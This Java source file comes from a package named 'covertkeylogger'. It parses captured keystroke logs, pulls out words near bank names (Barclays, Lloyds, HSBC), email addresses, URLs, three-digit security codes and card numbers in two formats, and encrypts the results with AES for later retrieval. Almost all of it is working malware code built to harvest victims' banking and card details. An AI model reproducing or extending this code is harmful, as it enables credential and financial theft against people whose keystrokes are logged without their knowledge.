package covertkeylogger;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class StoreToList {

	private FileInputStream fstream;
	private DataInputStream in;
	private BufferedReader br;
	private StringBuilder buff;
	private Cryptography crypto;
	private List<String> filteredData;

	public StoreToList(String path) {
		try {
			fstream = new FileInputStream(path);// file containing the
			// keylogging data
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
		in = new DataInputStream(fstream);
		br = new BufferedReader(new InputStreamReader(in));
		buff = new StringBuilder();
		crypto = new Cryptography("AES");
		filteredData = new ArrayList<String>();
	}

	public void generateList()
	{
		try {
			int i = 0;

			boolean start = true;
			int cap;
			int character;
			int counter = 0; // this counter counts the two significant words following a specific word type

			boolean two_more_words = false;
			int token_type;
			int previous_char = 32;
			do {
				character = br.read(); // read a single character from the input file

				if (character != -1) {
					if (start == true) // if the read character is the first of the file
					{
						buff.append((char) character); // store the character in a buffer

						previous_char = character;
						start = false;
					} else {
						// if the character is carriage return or line 
						if (character == 10 || character == 13) 
							//feed the replace this with #32 [space]
							character = 32;

						// if the read character is [space]#32 then word has been formed
						if (character == 32 && previous_char != 32) 
						{
							previous_char = character;

							if (two_more_words && buff.capacity() > 0) {

								byte[] ciphertext = crypto.encrypt(buff.toString().getBytes());
								filteredData.add(new String(ciphertext));
								// insert encrypted element in the list of interesting words 
								//it refers to the 1st or 2nd word following a specific word type

								counter = counter + 1;
								if (counter == 2) {
									counter = 0;
									two_more_words = false;
								}
							}
							token_type = word_type(buff);

							if (token_type != 0) // if this word is interesting
								// according to the patterns
							{


								byte[] ciphertext = crypto.encrypt(buff.toString().getBytes());
								filteredData.add(new String(ciphertext));
								// insert in the list of interesting words

								if (token_type == 1) {
									two_more_words = true;
									counter = 0;
								} else
									two_more_words = false;

								// System.out.println(word_type(buff)+" "+buff);
							}
							cap = buff.capacity();
							buff.delete(0, cap); // delete the content of the buffer
						} 
						else {
							previous_char = character;
							buff.append((char) character); // insert a character in the buffer
						}

					}
					i = i + 1; // characters' count
				}
			} while (character != -1); // until end of file
			if (word_type(buff) != 0) {


				byte[] ciphertext = crypto.encrypt(buff.toString().getBytes());
				filteredData.add(new String(ciphertext));
				// insert encrypted element in the list of interesting words

			}
			in.close();
		} catch (IOException e) {
			System.out.println("I DIDN'T READ ANY FILE!");
		} 
	}

	public List<String> getEncryptedList() {
		return filteredData;
	}

	public List<String> getDecryptedList() {
		return crypto.decrypt(filteredData);
	}
		
	
	
	public int word_type(StringBuilder lex) {
		String[] pattern;
		pattern = new String[6]; // string array for patterns
		int wordlen;
		int i;
		int asc; // ascii code of a specific character
		String word;
		word = lex.toString();
		int result;
		char[] chara = word.toCharArray();
		char character;
		result = 0;
		wordlen = lex.length();
		pattern[0] = "barclays";
		pattern[1] = "lloyds";
		pattern[2] = "hsbc";
		pattern[3] = "@";
		pattern[4] = "http";
		pattern[5] = "www.";
		for (i = 0; i <= 5; i++)
			result = 0;

		for (i = 0; i <= 2; i++) { // for capturing the words that contain
			// specific patterns

			if (word.contains(pattern[i])) { // System.out.println(i+"===>"+word
				// +" pat:"+pattern[i]);

				result = 1;
				return result;
			}
		}

		if (word.contains(pattern[3])) { // System.out.println(i+"===>"+word
			// +" pat:"+pattern[i]);

			result = 2;
			return result;
		}

		for (i = 4; i <= 5; i++) {// for capturing the words that starts with
			// specific patterns

			if (word.startsWith(pattern[i])) {
				result = 3;
				return result;
			}
		}

		if (wordlen == 3) { // for capturing 3 digit numbers
			result = 4;
			for (i = 0; i <= 2; i++) {
				character = chara[i];
				asc = (int) character;
				if (asc < 48 || asc > 57) {
					result = 0;
					return result;
				}
			}

		}

		if (wordlen == 16) { // for capturing cards' numbers of the format
			// 1234.5678.4567.7890 which are stored without
			// dots(.)

			result = 5;
			for (i = 0; i <= 15; i++) {
				character = chara[i];
				asc = (int) character;
				if (asc < 48 || asc > 57) { // checks if the 3 characters are
					// numeric
					//
					result = 0;
					return result;
				}
			}

		}

		if (wordlen == 19) {// for capturing cards' numbers of the format
			// 1234.5678.4567.7890

			result = 5;
			for (i = 0; i <= 18; i++) {
				character = chara[i];
				asc = (int) character;
				if ((i == 4 || i == 9 || i == 14) && (asc != 46))// if the
					// character
					// with
					// order
					// 4,9,14 is
					// not a dot
					// (.)

				{
					result = 0;
					return result;

				}

				if (i != 4 && i != 9 && i != 14 & (asc < 48 || asc > 57)) { // if
					// the
					// character,except
					// the
					// ones
					// with
					// order
					// 4,9,14
					// are
					// numeric

					result = 0;
					return result;
				}
			}

		}
		return result;
	}

	// DON'T CARE ABOUT THE METHOD BELOW

	/*
	 * public void encryptList(List<String> list) throws IOException,
	 * NoSuchAlgorithmException, NoSuchProviderException,
	 * NoSuchPaddingException, InvalidKeyException,
	 * InvalidParameterSpecException, InvalidAlgorithmParameterException {
	 * 
	 * try {
	 * 
	 * KeyGenerator kgen = KeyGenerator.getInstance("AES"); kgen.init(128);
	 * 
	 * SecretKey skey = kgen.generateKey();
	 * 
	 * ByteArrayOutputStream baos = new ByteArrayOutputStream();
	 * DataOutputStream out = new DataOutputStream(baos);
	 * 
	 * for (String s : list) { out.writeUTF(s); }
	 * 
	 * byte[] bytes = baos.toByteArray();
	 * System.out.println("The initial byte array is : " + bytes);
	 * 
	 * Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
	 * cipher.init(Cipher.ENCRYPT_MODE, skey); 
	 * AlgorithmParameters params =
	 * cipher.getParameters(); 
	 * byte[] iv =
	 * params.getParameterSpec(IvParameterSpec.class).getIV(); 
	 * byte[] ciphertext
	 * = cipher.doFinal(bytes.toString().getBytes());
	 * System.out.println("Ciphertext as byte array format is : " + ciphertext);
	 * String s1 = Arrays.toString(ciphertext);
	 * System.out.println("The encrypted array list as string format is: \n" +
	 * s1);
	 * 
	 * 
	 * // decryption below
	 * 
	 * // /* 
	 * 
	 * 
	 * 
	 * } catch (IllegalBlockSizeException e) { e.printStackTrace(); } catch
	 * (BadPaddingException e) { e.printStackTrace(); }
	 */

}
